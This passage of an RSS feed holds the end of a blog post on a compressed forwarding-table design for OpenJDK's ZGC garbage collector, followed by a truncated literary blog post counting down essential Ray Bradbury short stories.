<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<h2 id="references">References</h2>

<p>[1] Lidén P. <a href="https://mail.openjdk.java.net/pipermail/announce/2017-October/000237.html">CFV: New Project: ZGC; 2017</a>.</p>

<p>[2] Lidén P, Karlsson S. <a href="http://openjdk.java.net/jeps/333">JEP 333: ZGC: A Scalable Low-Latency Garbage Collector</a>.</p>
</div></div>]]>
            </description>
            <link>https://inside.java/2020/06/25/compact-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700451</guid>
            <pubDate>Wed, 01 Jul 2020 11:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Essential Bradbury (2018)]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 5 (<a href="https://news.ycombinator.com/item?id=23697573">thread link</a>) | @benbreen
<br/>
June 30, 2020 | http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury | <a href="https://web.archive.org/web/*/http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site">
		<div id="canvas">

			<!-- / headerWrapper -->

			<div id="pageWrapper" role="main">
				<section id="page" data-content-field="main-content">
					<article id="article-5c00433721c67cb58a2c167d" data-item-id="5c00433721c67cb58a2c167d">

	<div>
  <!--SPECIAL CONTENT-->

    

    <div>

    <!--POST HEADER-->

			<header>
				
				
			</header>

    <!--POST BODY-->

      <div><div data-layout-label="Post Body" data-type="item" data-updated-on="1543522407246" id="item-5c00433721c67cb58a2c167d"><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1543547389304_16960"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1543547495524-6SIUICX8KG62CPH06EUU/ke17ZwdGBToddI8pDm48kKY1mPzO9GKw7DK2Ogj0DkFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7SSwGn0TPzISNt3iSJufpctWMnaO_L-40UsXd4K4jrErboZrhY-qn3mDP5uwEjQu4Q/1.png" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1543547495524-6SIUICX8KG62CPH06EUU/ke17ZwdGBToddI8pDm48kKY1mPzO9GKw7DK2Ogj0DkFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7SSwGn0TPzISNt3iSJufpctWMnaO_L-40UsXd4K4jrErboZrhY-qn3mDP5uwEjQu4Q/1.png" data-image-dimensions="250x398" data-image-focal-point="0.5,0.5" alt="1.png" data-load="false" data-image-id="5c00aa30758d46f1d3c3a3c0" data-type="image" src="http://www.samweller.net/bradbury-1/2018/11/29/1.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-32e240a0acc2fe970f20"><div><p>When the first edition of <em>Listen to the Echoes: The Ray Bradbury Interviews </em>was published in June of 2010, I embarked upon an overly-ambitious project. I began a series on my blog titled “The Essential Bradbury,” where I intended on listing the 25 must-read Ray Bradbury short stories for any would-be Martian-neophytes. I listed out each story, its history, themes, and what made the tale top-shelf Bradbury. Over the next few years, I made it all the way to 18 stories! But, then, the old web site came down as <a href="https://hatandbeard.com/products/listen-to-the-echoes-the-ray-bradbury-interviews"><em>Listen to the Echoes</em></a> was published in a handsome new edition by a new publisher and, alas, I never completed the 25 “Essential Bradbury” stories.</p><p>So here I go again! Fans have been writing me, asking if I would re-post the old story suggestions and, at long last, finish the project. And so it begins. I figure I only have seven more stories to write about! I have reordered many of my choices. I will be counting down from 25 to number 1 over the next few weeks. </p><p>People often ask, "where should I begin when it comes to reading Bradbury?"</p><p>The long answer? In 2010, Everyman's Library republished <a href="https://www.amazon.com/Stories-Bradbury-Everymans-Contemporary-Classics/dp/0307269051/ref=sr_1_1?ie=UTF8&amp;qid=1543608624&amp;sr=8-1&amp;keywords=the+stories+of+ray+bradbury"><em>The Stories of Ray Bradbury</em></a><em> </em>containing a staggering 100 of Bradbury's best short stories. Along with this, there is the equally voluminous <a href="https://www.amazon.com/Bradbury-Stories-Most-Celebrated-Tales/dp/0060544880/ref=sr_1_1?ie=UTF8&amp;qid=1543608705&amp;sr=8-1&amp;keywords=bradbury+stories"><em>Bradbury Stories</em></a>, published in 2003, containing&nbsp;yet another 100 more short fictional gems. (Bradbury dedicated this last book, in part to me, an incredible, stirring gift.) Certainly, you cannot go wrong by reading either of these spectacular volumes. Bradbury is a master of the short story.&nbsp; It is, in my estimation, his strongest creative form. His wife of 56 years, Marguerite, agreed with me. Yet reading 200 stories is, for many, an unrealistic goal.</p><div><p>So the short answer of where to begin with Bradbury is this list, right here. I will offer up a streamlined list of 25 of my own personal favorite short fictions by the master of miracles. These stories will embody all the trademarks of vintage Bradbury: the lyrical language; the fantastic, original, and memorable ideas; the rich metaphor; and endings that sometimes surprise, sometimes sadden, always instruct and entertain. This list will be entirely subjective. These are my favorites. They will reflect a wide range, from weird tales to social science fiction to quiet and contemplative tales of contemporary literature. These tales are pure and classic Bradbury—our modern mythologist.</p><p><strong>#25 “THE FIRST NIGHT OF LENT”</strong></p></div><p><span>Where to Find It</span>: <em>A Medicine for Melancholy,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: <em>Playboy, March, 1956</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550443716450_14171"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550445266589-W6E84TP8S4U0BB58L3F7/ke17ZwdGBToddI8pDm48kJ5lO69Xq2dtpo5lPy1lHTx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaEAvh_lnjoYyE0Sqhj2kZbWoqJFgLgSux6sojh3xhhN2vILF1okCOvBQjrqH7Fjpg/440571710.0.x.jpg" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550445266589-W6E84TP8S4U0BB58L3F7/ke17ZwdGBToddI8pDm48kJ5lO69Xq2dtpo5lPy1lHTx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaEAvh_lnjoYyE0Sqhj2kZbWoqJFgLgSux6sojh3xhhN2vILF1okCOvBQjrqH7Fjpg/440571710.0.x.jpg" data-image-dimensions="1752x2576" data-image-focal-point="0.5,0.5" alt="440571710.0.x.jpg" data-load="false" data-image-id="5c69eacfeb39312979d92afc" data-type="image" src="http://www.samweller.net/bradbury-1/2018/11/29/440571710.0.x.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550443716450_17081"><div><p><span>Plot Synopsis</span>: A young screenwriter at work in Ireland in 1953 discovers that his ever-reliable regular taxicab driver has become dangerous and impaired when behind the wheel. Nick, the village driver, escorts the young writer from Dublin to the Irish countryside and the estate of the young screenwriter’s director. Nick then waits at the local pub until the writer is ready to be driven back to the city. There is never a problem, until the first night of Lent. . . .</p><p><span>Critique</span>: Any “essential” list of Bradbury short stories must include an Irish tale (as well as a Mexico story, a Mars story, and a Green Town story, for that matter). The problem is, of course, <em>which</em> Irish story? I choose this one for two simple reasons. First, Bradbury takes the lyrical quality of his voice and drenches it in a poetic and authentic Irish brogue.</p><p><em>Nick, now</em>. <em>See his easy hands loving the wheel in a slow clocklike turning as soft and silent as winter constellations snow down the sky. Listen to his mist-breathing voice all night-quiet as he charms the road, his foot a tenderly benevolent pat on the whispering accelerator, never a mile under thirty, never two miles over. Nick, Nick and his steady boat gentling a mild sweet lake where all Time slumbers. Look, compare. And bind such a man to you with summer grasses, gift him with silver, shake his hand warmly at each journey’s end</em></p><p><em>“Good night, Nick,” I said at the hotel. “See you tomorrow.”</em></p><p><em>“God willing,” whispered Nick</em></p><p><em>And he drove softly away.</em></p><p>The second reason I have selected this story for “The Essential Bradbury” list is that this is the first Irish story Bradbury wrote. It is his first creation, fresh-removed and newly-minted from his own actual experiences of living in Dublin in the autumn of 1953 and the winter of 1954, writing the screenplay for <em>Moby Dick</em> for film director John Huston. From a biographical standpoint, it is fascinating to read a work of short fiction that is, ostensibly, memoir. And with “The First Night of Lent,” Bradbury had discovered a trove of material that would continue to yield rich story, culminating in the publication of the 1992 semi-autobiographical novel, <em>Green Shadow, White Whale</em>, a minor-class</p><p><span>The Beginning of the Irish Stories</span>: As Ray recalled, one night after he had returned from Ireland, he was in bed and a voice spoke to him</p><p>“Ray, darling!”</p><p>Ray responded, “Who is it?” </p><p>And the voice said, “It’s Nick, the cab driver who drove you back and forth from Dublin to Kilcock 80 or 90 times. Do you remember that, Ray? Do you?” </p><p>And Ray said, “Yes?”</p><p>And the voice said, “Would you mind puttin’ it down?” </p><p>So Ray Bradbury started writing his Irish stories, beginning with “The First Night of Lent.”</p><p><span>Historical Aside</span>: A fascinating <em>New York Times </em>article on John Huston’s Georgian Irish Manor, ran June 12, 2012. Check it out <a href="http://www.nytimes.com/2012/06/15/greathomesanddestinations/15iht-reireland15.html">here</a>.</p><p>This is the very house where, in 1953, Nick the cab driver picked Bradbury up late at night, to drive him back to Dublin. This is the very house where Ray say with John Huston, late into the Irish night, as Huston went over Ray’s adaptation of <em>Moby Dick</em>.</p><p><strong>#24 “THE SOUND OF SUMMER RUNNING”</strong></p><p><span>Where to Find It</span>:<em> Dandelion Wine</em>, <em>The Stories of Ray Bradbury</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550446114005_16095"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550446250953-C38R892LM92RLJ0IFCQN/ke17ZwdGBToddI8pDm48kBeOurrnhyeZYlyEeER2mxtZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVH-Ask3FRJIA38qhKz88m6J7At5I9ts1__JJprJ--S1DQbHOnfMQAbUDGB8JxudeQQ/illustration_2010_08_02_summer_in_the_air.jpg" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550446250953-C38R892LM92RLJ0IFCQN/ke17ZwdGBToddI8pDm48kBeOurrnhyeZYlyEeER2mxtZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVH-Ask3FRJIA38qhKz88m6J7At5I9ts1__JJprJ--S1DQbHOnfMQAbUDGB8JxudeQQ/illustration_2010_08_02_summer_in_the_air.jpg" data-image-dimensions="368x387" data-image-focal-point="0.5,0.5" alt="The illustration by Amos Sewell that accompanied the original publication of “Summer in the Air,” in the February 1956 issue of  Saturday Evening Post ." data-load="false" data-image-id="5c69eeaa0d92979b8b80b8dc" data-type="image" src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550446250953-C38R892LM92RLJ0IFCQN/ke17ZwdGBToddI8pDm48kBeOurrnhyeZYlyEeER2mxtZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVH-Ask3FRJIA38qhKz88m6J7At5I9ts1__JJprJ--S1DQbHOnfMQAbUDGB8JxudeQQ/illustration_2010_08_02_summer_in_the_air.jpg">
          </p>
        
          
        

        
          
          <figcaption>
            <p>The illustration by Amos Sewell that accompanied the original publication of “Summer in the Air,” in the February 1956 issue of <em>Saturday Evening Post</em>.</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550446114005_18693"><div><p><span>First Published as</span>: “Summer in the Air,” <em>The Saturday Evening Post</em>, February 18, 1956 </p><p><span>Plot Synopsis</span>: At the beginning of summer, 1928, Douglas Spaulding sees a pair of brand new tennis shoes in a storefront window. His shoes are worn out, his feet feel heavy, and he is convinced that this resplendent pair of Cream-Sponge Para Litefoot Shoes will change his summer forever.</p><p><span>Backstory</span>: Ray Bradbury on the origins of the story from <em>Listen to the Echoes: The Ray Bradbury Interviews</em>: </p><p>“I was on a bus going into Westwood a few years ago, and a young boy jumped on the bus, threw his money in the box, raced down the aisle, and threw himself into a seat across from me.&nbsp; And I looked at him, and I said, ‘My god, if I had his energy, I could write a poem every day, a story every week, a novel every month.&nbsp; What’s his secret?’&nbsp; I looked down at his feet.&nbsp; He had the brightest pair of new fresh tennis shoes on his feet.&nbsp; And I said, oh, my god, I can remember when I was a kid, my father taking me downtown and buying me my first pair of new summer tennis shoes.&nbsp; I went home, and I wrote the short story.”</p><p><span>Critique</span>: This story is a shining example of Bradbury’s range as a literary writer. The man did not need an otherworldly landscape or elements of the fantastic to meditate on the human experience. Bradbury found magic in the every day, in this case, in a new pair of tennis shoes and the perspective of youth. The best Bradbury, in my opinion, is rooted in unforgettable story with a philosophical question at its center, all told in his singular, poetic style.</p><p><span>The Prose</span>: <em>Somehow the people who made tennis shoes knew what boys needed and wanted. They put marshmallows and coiled springs in the soles and they wove the rest out of grasses bleached and fired in the wilderness. Somewhere deep in the soft loam of the shoes the thin hard sinews of the buck deer were hidden. The people that made the shoes must have watched a lot of winds blow the trees and a lot of rivers going down to the lakes. Whatever it was, it was in the shoes, and it was summer.</em></p><p><br> <strong>#23 “THE LONG RAIN”</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1553888873530_11881"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1553889142081-4YDUJY5EY92L2GEQK67F/ke17ZwdGBToddI8pDm48kE9vdaUtW8eSyhB82tvO9N97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTm7jWdqqvv6kr2zx2NswsomEsuHjXNafnlMhtqHse04OG5RdS43L90lwVSOToIGiP0/r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-%5B3%5D-4726-p.png" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1553889142081-4YDUJY5EY92L2GEQK67F/ke17ZwdGBToddI8pDm48kE9vdaUtW8eSyhB82tvO9N97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTm7jWdqqvv6kr2zx2NswsomEsuHjXNafnlMhtqHse04OG5RdS43L90lwVSOToIGiP0/r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-%5B3%5D-4726-p.png" data-image-dimensions="1439x1033" data-image-focal-point="0.5,0.5" alt="r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-[3]-4726-p.png" data-load="false" data-image-id="5c9e7771e2c483fa41a9dcdd" data-type="image" src="http://www.samweller.net/bradbury-1/2018/11/29/r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-[3]-4726-p.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1553888873530_14891"><div><p><span>Where to Find It</span>:<em> The Illustrated Man,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: As “Death-by-Rain” in <em>Planet Stories</em>, September, 1950.<em> </em></p><p><span>Plot Synopsis</span>: Ray Bradbury writes a Jack London story set on Venus. A marooned crew on the perpetually rain-saturated planet march through the thick and endless planetary jungle world desperately seeking a sun-dome, a man-made structure built by colonists that provides warmth, provisions and respite from the infinite rain.</p><p><span>Cinematic History</span>: Director Jack Smight brought the story to the screen in the 1969 adaptation of the<em> Illustrated Man, </em>a critical and box-office disaster. </p><p><span>Personal Anecdote</span>: No question, this is classic Bradbury. But I am also partial to it. “The Long Rain” is the first Ray Bradbury story I ever read. I was 11-years-old and I was never the same again.</p><p><span>Passage of Exemplary Bradburian Prose:</span> <em>"It was a hard rain, a perpetual rain, a sweating and steaming rain; it was a mizzle, a downpour, a fountain, a whipping in the eyes, an undertow at the ankles; it was a rain to drown all rains and the memory of rains."</em></p><p><span>Th…</span></p></div></div></div></div></div></div></div></div></article></section></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury">http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury</a></em></p>]]>
            </description>
            <link>http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury</link>
            <guid isPermaLink="false">hacker-news-small-sites-23697573</guid>
            <pubDate>Wed, 01 Jul 2020 03:50:02 GMT</pubDate>
        </item>
    </channel>
</rss>
